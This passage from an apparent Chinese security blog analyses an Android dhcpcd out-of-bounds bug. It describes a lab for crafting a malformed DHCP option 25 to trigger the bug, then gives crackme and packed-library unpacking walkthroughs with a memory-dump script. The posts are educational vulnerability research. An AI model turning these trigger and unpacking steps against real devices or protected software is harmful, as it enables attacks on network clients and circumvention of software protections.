memcpy(&amp;s32, data, sizeof(s32));</div><div class="line">			s32 = ntohl(s32);</div><div class="line">			l = snprintf(s, len, &quot;%d&quot;, s32);</div><div class="line">			data += sizeof(s32);</div><div class="line">		&#125; else if (type &amp; IPV4) &#123;</div><div class="line">			memcpy(&amp;addr.s_addr, data, sizeof(addr.s_addr));</div><div class="line">			l = snprintf(s, len, &quot;%s&quot;, inet_ntoa(addr));</div><div class="line">			data += sizeof(addr.s_addr);</div><div class="line">		&#125; else</div><div class="line">			l = 0;</div><div class="line">		if (len &lt;= l) &#123;</div><div class="line">			bytes += len;</div><div class="line">			break;</div><div class="line">		&#125;</div><div class="line">		len -= l;</div><div class="line">		bytes += l;</div><div class="line">		s += l;</div><div class="line">	&#125;</div><div class="line">	return bytes;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>从上述的代码可以看到，第一次的调用将会在”return (l + 1) * dl ”这里返回，并且会返回一个len作为第二次调用的第二个参数再次传入print_option函数。第二次调用print_option函数的时候，dl的值影响了while循环，这个循环在第一次调用print_option函数是无法进入的。<br>    分析到这里，可以推断之前在valid_length函数中未合理校验的dl值传入到了此while循环中，正是由于之前的校验不够完整使得在此while循环中dl的值不合法，最终导致了该漏洞的形成。<br>整个在客户端的过程如图所示：</p>
<p><img src="http://img.blog.csdn.net/20170116121406215?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvaGs5MjU5/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" alt="这里写图片描述"></p>
<h2 id="三、测试环境的搭建"><a href="#三、测试环境的搭建" class="headerlink" title="三、测试环境的搭建"></a>三、测试环境的搭建</h2><pre><code>由于该漏洞的特殊性，需要开启一个热点，搭建一个Dhcpd服务器以及一个带log的dhcpcd的客户端来验证此漏洞，这里选用的系统为Ubuntu14.04。
</code></pre><p>3.1 Hostapd热点的搭建</p>
<p>安装Hostapd：<br>sudo apt-get install hostapd</p>
<p>安装了软件以后，在/etc/hostapd文件夹中建立一个hostapd.conf的文件，在里面写入接入点的信息。<br>配置Hostapd：<br>sudo nano /etc/hostapd/hostapd.conf</p>
<p>hostapd.conf文件改成如下：</p>
<hr>
<p>interface=wlan0//改成对应的网卡<br>driver=nl80211//这个driver一定得是这个<br>ssid=baobaonihao<br>hw_mode=g<br>channel=10<br>macaddr_acl=0<br>auth_algs=3<br>wpa=2<br>wpa_passphrase=qqqq1111<br>wpa_key_mgmt=WPA-PSK<br>wpa_pairwise=TKIP CCMP<br>rsn_pairwise=TKIP CCMP</p>
<hr>
<p>注意要自己设置其中的无线热点名称ssid和认证密码wpa_passphrase。</p>
<pre><code>上述配置完成以后，在终端执行sudo hostapd /etc/hostapd/hostapd.conf -B(-B是需要在后台运行的时候添加)，到这里，就表明Hostapd的安装和配置结束了，现在已经可以在手机终端上可以搜索到这个baobaonihao 的热点了，但是无法连接到这个热点，此时应该出现的情况是：正在获取IP地址，但是一直获取不到。这是由于dhcpd服务器没搭建好的原因，接下来就是dhcpd服务器的搭建。
</code></pre><p>3.2 Dhcpd服务器的编译与搭建<br>    这个dhcpd服务器不能直接用apt-get来安装，可以在官网<a href="https://www.isc.org/" target="_blank" rel="external">https://www.isc.org/</a> 里面找到源码并且下载，进行编译安装。<br>    下载之后为一个dhcp-4.3.4.tar.gz包。<br>安装官方原始版本如下：<br>tar zxvf dhcp-4.3.4.tar.gz</p>
<p>cd dhcp-4.3.4</p>
<p>chmod 777 configure</p>
<p>sudo ./configure</p>
<p>sudo make </p>
<p>sudo make install</p>
<p>安装debug版本如下，debug版本能输出log，在之后的构建package中方便查看调试以及log信息：</p>
<p>tar zxvf dhcp-4.3.4.tar.gz</p>
<p>cd dhcp-4.3.4</p>
<p>chmod 777 configure</p>
<p>sudo ./configure –enable-debug</p>
<p>sudo make </p>
<p>sudo make install</p>
<p>这样就可以编译安装一个调试版本了。</p>
<p>同样的，安装了软件以后，在/etc/dhcp文件夹中建立一个dhcpd.conf的配置文件，在里面写入dhcpd的配置信息。</p>
<p>dhcpd.conf文件改成如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">************************</div><div class="line">ddns-update-style none;</div><div class="line">log-facility local7;</div><div class="line"></div><div class="line">subnet 172.20.94.0 netmask 255.255.255.0 &#123;</div><div class="line">        option routers                  172.20.94.1;</div><div class="line">        option subnet-mask              255.255.255.0;</div><div class="line">        option broadcast-address        172.20.94.255;</div><div class="line">	option domain-name &quot;internal.baidu.com&quot;;</div><div class="line">        option domain-name-servers      172.22.1.253,172.22.1.254;</div><div class="line">        option ntp-servers              172.20.94.1;</div><div class="line">        option netbios-name-servers     172.20.94.1;</div><div class="line">        option netbios-node-type 2;</div><div class="line">        default-lease-time 86400;</div><div class="line">        max-lease-time 86400;</div><div class="line">	range 172.20.94.0 172.20.94.100;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>在上述配置完成以后我们需要手动给wlan0配置IP地址并且启动它，在终端输入：</p>
<p>sudo ifconfig wlan0 172.20.94.1 </p>
<p>sudo dhcpd /etc/dhcp/dhcpd.conf</p>
<p>就可以启动dhcpd了，此时可以获取到ip地址了，已经可以成功发包了，如果要上网，则还要输入以下命令：</p>
<p>开启内核IP转发<br>bash -c “echo 1 &gt; /proc/sys/net/ipv4/ip_forward”<br> 开启防火墙NAT转发(如果本机使用eth0上网,则把ppp0改为eth0)<br>iptables -t nat -A POSTROUTING -o ppp0 -j MASQUERADE</p>
<p>这样Dhcpd服务器的编译与搭建到此就完成了，以及可以修改源码取任意构造数据包了。</p>
<p>3.3 Dhcpcd客户端增加log编译。<br>    采用4.4.4版本的源码来编译<br>log函数如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line">void MYLOG(const char* ms, ...);</div><div class="line">void MYLOG(const char* ms, ...)  </div><div class="line">&#123;  </div><div class="line">    char wzLog[1024] = &#123;0&#125;;  </div><div class="line">    char buffer[1024] = &#123;0&#125;;  </div><div class="line">    va_list args;  </div><div class="line">    va_start(args, ms);  </div><div class="line">    vsprintf( wzLog ,ms,args);  </div><div class="line">    va_end(args);  </div><div class="line"> </div><div class="line">    time_t now;  </div><div class="line">    time(&amp;now);  </div><div class="line">    struct tm *local;  </div><div class="line">    local = localtime(&amp;now);  </div><div class="line">    sprintf(buffer,&quot;%04d-%02d-%02d %02d:%02d:%02d %s\n&quot;, local-&gt;tm_year+1900, local-&gt;tm_mon,  </div><div class="line">                local-&gt;tm_mday, local-&gt;tm_hour, local-&gt;tm_min, local-&gt;tm_sec,  </div><div class="line">                wzLog);  </div><div class="line">    FILE* file = fopen(&quot;/data/local/tmp/dhcplog&quot;,&quot;a+&quot;);  </div><div class="line">    fwrite(buffer,1,strlen(buffer),file);  </div><div class="line">    fclose(file);  </div><div class="line"> </div><div class="line">  // syslog(LOG_INFO,wzLog);  </div><div class="line">    return ;  </div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>编译的话直接make即可编译</p>
<h2 id="四、dhcp发包交互过程"><a href="#四、dhcp发包交互过程" class="headerlink" title="四、dhcp发包交互过程"></a>四、dhcp发包交互过程</h2><pre><code>要想触发该漏洞，当然得了解dhcp服务器与客户端之间的交互。那它们之间是怎么样交互的呢？    DHCP协议采用UDP作为传输协议，主机发送请求消息到DHCP服务器的67号端口，DHCP服务器回应应答消息给主机的68号端口。
</code></pre><p>DHCP Client以广播的方式发出DHCP Discover报文。</p>
<p>所有的DHCP Server都能够接收到DHCP Client发送的DHCP Discover报文，所有的DHCP Server都会给出响应，向DHCP Client发送一个DHCP Offer报文。<br>DHCP Offer报文中“Your(Client) IP Address”字段就是DHCP Server能够提供给DHCP Client使用的IP地址，且DHCP Server会将自己的IP地址放在“option”字段中以便DHCP Client区分不同的DHCP Server。DHCP Server在发出此报文后会存在一个已分配IP地址的纪录。</p>
<p>DHCP Client只能处理其中的一个DHCP Offer报文，一般的原则是DHCP Client处理最先收到的DHCP Offer报文。<br>DHCP Client会发出一个广播的DHCP Request报文，在选项字段中会加入选中的DHCP Server的IP地址和需要的IP地址。</p>
<p>DHCP Server收到DHCP Request报文后，判断选项字段中的IP地址是否与自己的地址相同。如果不相同，DHCP Server不做任何处理只清除相应IP地址分配记录；如果相同，DHCP Server就会向DHCP Client响应一个DHCP ACK报文，并在选项字段中增加IP地址的使用租期信息。</p>
<p>DHCP Client接收到DHCP ACK报文后，检查DHCP Server分配的IP地址是否能够使用。如果可以使用，则DHCP Client成功获得IP地址并根据IP地址使用租期自动启动续延过程；如果DHCP Client发现分配的IP地址已经被使用，则DHCP Client向DHCPServer发出DHCP Decline报文，通知DHCP Server禁用这个IP地址，然后DHCP Client开始新的地址申请过程。</p>
<p>DHCP Client在成功获取IP地址后，随时可以通过发送DHCP Release报文释放自己的IP地址，DHCP Server收到DHCP Release报文后，会回收相应的IP地址并重新分配。</p>
<pre><code>可以得知DHCP  Server会向DHCP Client响应一个DHCP ACK报文，而这个ACK报文能触发到漏洞代码片段，而需要知道的就是如何构建自己的DHCP ACK报文。查看Server端的代码，找到处理客户端报文的函数为void dhcp (struct packet *packet) ，代码片段如下：
</code></pre><p><img src="http://img.blog.csdn.net/20170116121803638?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvaGs5MjU5/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" alt="这里写图片描述"></p>
<p>对应的ACK 报文当然是DHCPREQUEST，继续查看dhcprequest函数，在结尾处找到:<br><img src="http://img.blog.csdn.net/20170116121838920?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvaGs5MjU5/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" alt="这里写图片描述"></p>
<p>可以发现，是ack_lease (packet, lease, DHCPACK, 0, msgbuf, ms_nulltp,(struct host_decl *)0);这个函数，继续追踪，还是在尾部：</p>
<p><img src="http://img.blog.csdn.net/20170116121907092?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvaGs5MjU5/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" alt="这里写图片描述"></p>
<p>进入dhcp_reply(lease),继续追踪：</p>
<p><img src="http://img.blog.csdn.net/20170116121937643?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvaGs5MjU5/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" alt="这里写图片描述"></p>
<p>进入cons_options函数，还是在函数的尾部发现：<br>    memcpy(outpacket-&gt;options, buffer, index);</p>
<pre><code>length = DHCP_FIXED_NON_UDP + index;

return length;


这里的buffer就是储存数据包中options字段的地方了，在这个memcpy之前改写这个buffer，再对应的把index改成数据包中options字段实际的长度就可以了。
</code></pre><h2 id="五、发包验证"><a href="#五、发包验证" class="headerlink" title="五、发包验证"></a>五、发包验证</h2><pre><code>可以先发个包熟悉一下格式是什么样的（Hex格式）：
</code></pre><p><img src="http://img.blog.csdn.net/20170116122048373?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvaGs5MjU5/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" alt="这里写图片描述"></p>
<p>表示的是一个完整的DHCP ACK 数据包，这个数据包的格式如下：<br>0                   1                   2                   3<br>   0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1<br>   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+<br>   |     op (1)    |   htype (1)   |   hlen (1)    |   hops (1)    |<br>   +—————+—————+—————+—————+<br>   |                            xid (4)                            |<br>   +——————————-+——————————-+<br>   |           secs (2)            |           flags (2)           |<br>   +——————————-+——————————-+<br>   |                          ciaddr  (4)                          |<br>   +—————————————————————+<br>   |                          yiaddr  (4)                          |<br>   +—————————————————————+<br>   |                          siaddr  (4)                          |<br>   +—————————————————————+<br>   |                          giaddr  (4)                          |<br>   +—————————————————————+<br>   |                                                               |<br>   |                          chaddr  (16)                         |<br>   |                                                               |<br>   |                                                               |<br>   +—————————————————————+<br>   |                                                               |<br>   |                          sname   (64)                         |<br>   +—————————————————————+<br>   |                                                               |<br>   |                          file    (128)                        |<br>   +—————————————————————+<br>   |                                                               |<br>   |                          options (variable)                   |<br>   +—————————————————————+</p>
<p>具体参数含义请参考rfc2131[1]文档，这里关注的是最后一个字段options，这个字段就是导致漏洞触发的关键点。</p>
<p>为了顺利的利用长度校验不合理的这个缺陷，可以把opt-&gt;type设置成UINT16和ARRAY，查找一下这种type的option在客户端的源码对应的option号码，如下：<br><img src="http://img.blog.csdn.net/20170116122204084?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvaGs5MjU5/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" alt="这里写图片描述"></p>
<p>option的号码为25，为了清楚25这个option的格式，查看rfc2132[2]文档找到描述如下：</p>
<p>4.7. Path MTU Plateau Table Option</p>
<p>   This option specifies a table of MTU sizes to use when performing<br>   Path MTU Discovery as defined in RFC 1191.  The table is formatted as<br>   a list of 16-bit unsigned integers, ordered from smallest to largest.<br>   The minimum MTU value cannot be smaller than 68.</p>
<p>   The code for this option is 25.  Its minimum length is 2, and the<br>   length MUST be a multiple of 2.</p>
<pre><code>Code   Len     Size 1      Size 2
</code></pre><p>   +—–+—–+—–+—–+—–+—–+—<br>   |  25 |  n  |  s1 |  s2 |  s1 |  s2 | …<br>   +—–+—–+—–+—–+—–+—–+—<br>    从上述的描述可以得知最小长度n规定为2，且长度为2的整数倍。但是可以构建一个option为25长度为3的数据包，既可以在长度校验函数中返回1从而通过校验，又能进入print_option函数中的while循环，当进入while循环后如下:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">t = data;</div><div class="line">	e = data + dl;</div><div class="line">	while (data &lt; e) &#123;</div><div class="line"></div><div class="line">	…...</div><div class="line"></div><div class="line">	else if (type &amp; UINT16) &#123;</div><div class="line">			memcpy(&amp;u16, data, sizeof(u16));</div><div class="line">			u16 = ntohs(u16);</div><div class="line">			l = snprintf(s, len, &quot;%d&quot;, u16);</div><div class="line">			data += sizeof(u16);</div><div class="line">		&#125; </div><div class="line"></div><div class="line">	…...</div><div class="line"></div><div class="line"></div><div class="line">	&#125;</div></pre></td></tr></table></figure>
<p>dl为3，而data每次循环后只加了2，导致了此while循环多循环了一次，memcpy多copy了一次2字节，造成了越界。至此整个漏洞就分析完毕。</p>
<pre><code>By Ericky

2016.06.06
</code></pre><p>参考链接：</p>
<p>[1] <a href="https://tools.ietf.org/html/rfc2131" target="_blank" rel="external">https://tools.ietf.org/html/rfc2131</a></p>
<p>[2] <a href="https://tools.ietf.org/html/rfc2132" target="_blank" rel="external">https://tools.ietf.org/html/rfc2132</a></p>
<p>[3] <a href="https://android.googlesource.com/platform/external/dhcpcd/+/1390ace71179f04a09c300ee8d0300aa69d9db09" target="_blank" rel="external">https://android.googlesource.com/platform/external/dhcpcd/+/1390ace71179f04a09c300ee8d0300aa69d9db09</a></p>
<p>[4] <a href="http://source.android.com/security/bulletin/2016-04-02.html" target="_blank" rel="external">http://source.android.com/security/bulletin/2016-04-02.html</a></p>
<p>[5] <a href="http://www.isc.org/downloads/" target="_blank" rel="external">http://www.isc.org/downloads/</a></p>
<p>[6] <a href="https://help.ubuntu.com/community/isc-dhcp-server" target="_blank" rel="external">https://help.ubuntu.com/community/isc-dhcp-server</a></p>

    
  </div>
  <footer class="end-sep">
    
      
      
    
    <div class="clearfix"></div>
  </footer>
</article>


  
    <article class="post">
  <header>
    
      <div class="icon"></div>
      <a href="/2016/01/03/一枚KeyGenMe分析/">
  <time datetime="2016-01-03T11:43:00.000Z">
    2016-01-03
  </time>
</a>
    
    
  
    <h1 class="title"><a href="/2016/01/03/一枚KeyGenMe分析/">一枚KeyGenMe分析</a></h1>
  

  </header>
  
  <div class="entry">
    
      <h1 id="一枚KeyGenMe分析"><a href="#一枚KeyGenMe分析" class="headerlink" title="一枚KeyGenMe分析"></a>一枚KeyGenMe分析</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>玩CM的人好像很少，大家都缺乏热情，小弟在此分析一枚，错误之处望各位大侠不吝指正。</p>
<p>“元旦佳节，难得有闲情逸致。品一杯香茗，看IDA中的汇编代码。”<br>虽说是迟到的祝福，但这里还是先祝各位朋友元旦快乐，愿大家的技术蒸蒸日上，身体棒，棒，棒！在逆向这条荆棘密布的道路上，难免遇到各种各样的困难，有的甚至是看似不可逾越的鸿沟。但话又说回来，其实逆向这个领域，很多技术是相通的，思维方式更是相通的。<br>网上的资料并不少，教程和文章都很多，少的就是大家对一些新问题的思考，对一些知识的灵活运用和融会贯通。</p>
<h2 id="初探加壳so"><a href="#初探加壳so" class="headerlink" title="初探加壳so"></a>初探加壳so</h2><p>一般来说，我们从java层入手，在跟踪某一个关键函数或者一个关键变量的时候，会跟到一个native的函数里，这个时候就需要进入深邃的so。或许很多人会害怕so加壳，觉得那么遥不可及。我们来揭开加壳后so的神秘面纱，让大家对so加壳不再畏惧。<br>打开IDA定位到关键函数后：<br><img src="http://img.blog.csdn.net/20160103193830728" alt="这里写图片描述"></p>
<p>如图，指令都被抹掉了，关键的函数完完全全被“清空”。<br>其他函数也一并被清空：<br><img src="http://img.blog.csdn.net/20160103193844500" alt="这里写图片描述"></p>
<p>##卸下加壳so的外衣<br>尽管IDA加载的so里面的指令都被清空了，但是有一条不变的宗旨。那就是这些代码在执行之前肯定要解密的，解密的时候那就肯定在内存中，既然在内存中，我们就可以把它拿出来。<br>在关键函数段首下好断点：<br><img src="http://img.blog.csdn.net/20160103193854465" alt="这里写图片描述"></p>
<p>IDA附加程序，出现same则点击same对话框。接下来需要让程序断在我们的断点处，代码已经解密出来了：<br><img src="http://img.blog.csdn.net/20160103193902192" alt="这里写图片描述"><br>接下来用Ctrl+S 来定位一下该so在内存中的位置，用以下IDC脚本dump出来即可：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">auto fp, SoAddress;</div><div class="line">fp = fopen(&quot;D:\\unpack.so&quot;, &quot;wb&quot;);</div><div class="line">for ( SoAddress=0x51F6546C; SoAddress&lt; 0x51F6B7B8; SoAddress++ )</div><div class="line">fputc(Byte(SoAddress), fp);</div></pre></td></tr></table></figure>
<h2 id="脱壳前后对比"><a href="#脱壳前后对比" class="headerlink" title="脱壳前后对比"></a>脱壳前后对比</h2><p><img src="http://img.blog.csdn.net/20160103193935027" alt="这里写图片描述"></p>
<p>左边为加壳后的指令，都被抹去<br>右边为脱壳后的指令，全部恢复</p>
<p>细心的读者，肯定会发现，这和脱dex很相似，是的，这就是脱dex的方法在脱so壳上的再利用。</p>
<h2 id="So里面遨游"><a href="#So里面遨游" class="headerlink" title="So里面遨游"></a>So里面遨游</h2><p>在check函数里面：<br><img src="http://img.blog.csdn.net/20160103193958340" alt="这里写图片描述"></p>
<p>可以看到最后对比的字符串为：XVccAwVbVQQE<br>我们从最后开始往前推到。<br>转换成相对应的Hex如下:<br>0x58 0x56 0x63 0x63</p>
<p>0x41 0x77 0x56 0x62</p>
<p>0x56 0x51 0x51 0x45</p>
<p>这些Hex的值怎么算出来的呢？继续往前看：<br>在base64encode函数中：<br><img src="http://img.blog.csdn.net/20160103194010501" alt="这里写图片描述"></p>
<p>一共12个值，通过num2base64char函数，循环3次，每次4个值。<br>进入num2base64char函数里看算法：<br><img src="http://img.blog.csdn.net/20160103194045356" alt="这里写图片描述"></p>
<p>贴一段转换后的java代码：<br>     public static int NumToChar(int a1){<br>         {<br>             int v2 ;<br>              if ( a1 &lt;= 0x19 ) //65到90<br>                return (a1 + 65);<br>              if ( a1 &lt;= 0x33 )//<br>                return (a1 + 71);//71到122<br>              if ( a1 &lt;= 0x3D )//61-4<br>                return (a1 - 4);<br>              v2 = 43;<br>              if ( a1 != 62 )<br>              {<br>                if ( a1 == 63 )<br>                {<br>                  v2 = 47;<br>                }<br>                else if ( a1 == 64 )<br>                {<br>                  v2 = 61;<br>                }<br>              }<br>              return v2;<br>            }<br>根据这段算法逆推出Numtochar之前的Hex为:<br>0x17 0x15 0x1c 0x1c</p>
<p>0x00 0x30 0x15 0x1b</p>
<p>0x15 0x10 0x10 0x04</p>
<p>继续向前看，找出这12个Hex的值是如何来的：<br><img src="http://img.blog.csdn.net/20160103194057046" alt="这里写图片描述"><br>图中红框的函数为关键函数，进去看一下：<br><img src="http://img.blog.csdn.net/20160103194306875" alt="这里写图片描述"></p>
<p>传入3个参数，生成了4个结果。所以之前的12个Hex的值应该是3组3位的Hex值生成的，根据算法，解密程序如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">int x ,y ,z ,four1,four2,four3,four4;</div><div class="line">for(x=0;x&lt;=0xff;x++)&#123;</div><div class="line">	for(y=0;y&lt;=0xff;y++)&#123;</div><div class="line">		for(z=0;z&lt;=0xff;z++)&#123;</div><div class="line">			four1 = x&gt;&gt;2;</div><div class="line">			four2 = (16 * x &amp; 0x30) + (y &gt;&gt; 4);</div><div class="line">			four3 = (4 * y &amp; 0x3C) + (z &gt;&gt; 6);</div><div class="line">			four4 = z &amp; 0x3F;</div><div class="line">			if(four1==0x15 &amp;&amp; four2==0x10 &amp;&amp;  four3==0x10 &amp;&amp; four4==0x04)&#123;</div><div class="line">				System.out.println(&quot;X:0x&quot;+Integer.toHexString(x)+&quot; Y:0x&quot;+Integer.toHexString(y)+&quot; Z:0x&quot;+Integer.toHexString(z));</div><div class="line">			&#125;</div><div class="line">		&#125;</div><div class="line">	&#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>得出3组3位的Hex值如下：<br>0x5d 0x57 0x1c<br>0x03 0x05 0x5b<br>0x55 0x04 0x04<br>再往前就是java层了：只要传入的字符串为以下Hex则成功：<br>16进制：5d 57 1c 03 05 5b 55 04 04</p>
<pre><code> | |
| |
</code></pre><hr>
<p>   \  /<br>      \/</p>
<p>  JAVA层<br>JAVA层的加密函数为：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div></pre></td><td class="code"><pre><div class="line">public static String Encrpt(String arg9, String arg10) &#123;</div><div class="line">        String v0_2;</div><div class="line">        String v1 = null;</div><div class="line">        if(arg9 != null &amp;&amp; arg10 != null) &#123;</div><div class="line">            try &#123;</div><div class="line">                char[] v2 = arg10.toCharArray();</div><div class="line">                char[] v3 = arg9.toCharArray();</div><div class="line">                int v4 = v3.length; //v4 =9</div><div class="line">                int v5 = v2.length;</div><div class="line">                char[] v6 = new char[v4];</div><div class="line">                int v0_1;</div><div class="line">                for(v0_1 = 0; v0_1 &lt; v4; ++v0_1) &#123;</div><div class="line">                	System.out.println((int)(v3[v0_1])+&quot; ^ &quot;+(int)v2[v0_1 % v5]);</div><div class="line">                    v6[v0_1] = ((char)(v3[v0_1] ^ v2[v0_1 % v5]));</div><div class="line">                &#125;</div><div class="line"></div><div class="line">                v0_2 = new String(v6);</div><div class="line">            &#125;</div><div class="line">            catch(Exception v0) &#123;</div><div class="line">                v0.printStackTrace();</div><div class="line">                v0_2 = v1;</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">        else &#123;</div><div class="line">            v0_2 = v1;</div><div class="line">        &#125;</div><div class="line">        return v0_2;</div><div class="line">    &#125;</div><div class="line">	public static String toHexString(String s) &#123;</div><div class="line">		String str = &quot;&quot;;</div><div class="line">		for (int i = 0; i &lt; s.length(); i++) &#123;</div><div class="line">			int ch = (int) s.charAt(i);</div><div class="line">			String s4 = Integer.toHexString(ch);</div><div class="line">			System.out.println((i+1)+&quot;: 0x&quot;+s4);</div><div class="line">			str = str + s4;</div><div class="line">		&#125;</div><div class="line">		return str;</div><div class="line">	&#125;</div></pre></td></tr></table></figure>
<p>运算都是异或加密，逆运算就是结果与key再异或回来，而key在Java层已经可以知道，为”52pojie”,所以异或回来的答案如下：<br>Answer:104 101 108 108 111 50 48 49 54</p>
<p>最后再查一下ASCII码表得出答案为：hello2016<br>验证一下：</p>
<p><img src="http://img.blog.csdn.net/20160103194155690" alt="这里写图片描述"></p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>希望通过对这篇文章阅读，你已经对so不再恐惧了。再次祝大家2016年有新的收获！</p>
<p>2016年元旦</p>
<p> By Ericky </p>

    
  </div>
  <footer class="end-sep">
    
      
      
    
    <div class="clearfix"></div>
  </footer>
</article>


  
    <article class="post">
  <header>
    
      <div class="icon"></div>
      <a href="/2016/01/02/学会”融会贯通”简易脱某So壳/">
  <time datetime="2016-01-02T11:19:00.000Z">
    2016-01-02
  </time>
</a>
    
    
  
    <h1 class="title"><a href="/2016/01/02/学会”融会贯通”简易脱某So壳/">学会“融会贯通”简易脱某So壳</a></h1>
  

  </header>
  
  <div class="entry">
    
      <h1 id="学会”融会贯通”简易脱某So壳"><a href="#学会”融会贯通”简易脱某So壳" class="headerlink" title="学会”融会贯通”简易脱某So壳"></a>学会”融会贯通”简易脱某So壳</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>“元旦佳节，难得有闲情逸致。品一杯香茗，看IDA中的汇编代码。”<br>虽说是迟到的祝福，但这里还是先祝各位朋友元旦快乐，愿大家的技术蒸蒸日上，身体棒，棒，棒！在逆向这条荆棘密布的道路上，难免遇到各种各样的困难，有的甚至是看似不可逾越的鸿沟。但话又说回来，其实逆向这个领域，很多技术是相通的，思维方式更是相通的。<br>网上的资料并不少，教程和文章都很多，少的就是大家对一些新问题的思考，对一些知识的灵活运用和融会贯通。今天就用这样的方式来脱一下某公司的so壳。论证一下融会贯通在逆向领域甚至说在“这个稀少方向”的重要性。</p>
<h2 id="初探加壳so"><a href="#初探加壳so" class="headerlink" title="初探加壳so"></a>初探加壳so</h2><p>一般来说，我们从java层入手，在跟踪某一个关键函数或者一个关键变量的时候，会跟到一个native的函数里，这个时候就需要进入深邃的so。或许很多人会害怕so加壳，觉得那么遥不可及。我们来揭开加壳后so的神秘面纱，让大家对so加壳不再畏惧。<br>打开IDA定位到关键函数后：<br><img src="http://img.blog.csdn.net/20160103191748537" alt="这里写图片描述"><br>如图，指令都被抹掉了，关键的函数完完全全被“清空”。<br>其他函数也一并被清空：<br><img src="http://img.blog.csdn.net/20160103191758078" alt="这里写图片描述"></p>
<h2 id="卸下加壳so的外衣"><a href="#卸下加壳so的外衣" class="headerlink" title="卸下加壳so的外衣"></a>卸下加壳so的外衣</h2><p>尽管IDA加载的so里面的指令都被清空了，但是有一条不变的宗旨。那就是这些代码在执行之前肯定要解密的，解密的时候那就肯定在内存中，既然在内存中，我们就可以把它拿出来。<br>在关键函数段首下好断点：<br><img src="http://img.blog.csdn.net/20160103191809592" alt="这里写图片描述"></p>
<p>IDA附加程序，出现same则点击same对话框。接下来需要让程序断在我们的断点处，代码已经解密出来了：<br><img src="http://img.blog.csdn.net/20160103191818904" alt="这里写图片描述"><br>接下来用Ctrl+S 来定位一下该so在内存中的位置，用以下IDC脚本dump出来即可：</p>
